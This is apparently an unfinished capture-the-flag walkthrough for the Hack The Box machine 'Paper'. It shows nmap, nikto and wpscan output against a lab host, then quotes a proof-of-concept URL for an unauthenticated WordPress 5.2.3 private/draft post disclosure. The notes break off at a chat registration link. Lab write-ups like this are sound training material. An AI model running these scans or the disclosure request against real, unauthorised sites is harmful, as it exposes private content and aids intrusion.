https://app.hackthebox.com/machines/Paper

```
─[eu-dedivip-1]─[10.10.14.17]─[htb-bitmangler@pwnbox-base]─[~]
└──╼ [★]$ nmap 10.129.72.199
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-13 04:47 BST
Nmap scan report for 10.129.72.199
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https


```

```
[eu-dedivip-1]─[10.10.14.17]─[htb-bitmangler@pwnbox-base]─[~]
└──╼ [★]$ nikto -h 10.129.72.199
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.72.199
+ Target Hostname:    10.129.72.199
+ Target Port:        80
+ Start Time:         2022-06-13 04:54:30 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-backend-server' found, with contents: office.paper
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.2.24
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST

```

when you change the hostname to office.paper we see a new site pop up.

wpscan result:
```
─[eu-dedivip-1]─[10.10.14.17]─[htb-bitmangler@pwnbox-base]─[~]
└──╼ [★]$ wpscan --url http://office.paper
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://office.paper/ [10.129.72.199]
[+] Started: Mon Jun 13 05:10:17 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2021-07-17T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:07 <=> (137 / 137) 100.00% Time: 00:00:07

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 13 05:10:38 2022
[+] Requests Done: 169
[+] Cached Requests: 5
[+] Data Sent: 41.636 KB
[+] Data Received: 167.972 KB
[+] Memory used: 233.637 MB
[+] Elapsed time: 00:00:20

```

uses insecure wordpress version

WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
Description
This vulnerability could allow an unauthenticated user to view private or draft posts due to an issue within WP_Query.
Proof of Concept
http://wordpress.local/?static=1&order=asc 

looking at the chats:

http://chat.office.paper/register/8qozr226AhkCHZdyY

the pwnbox machine stopped here.

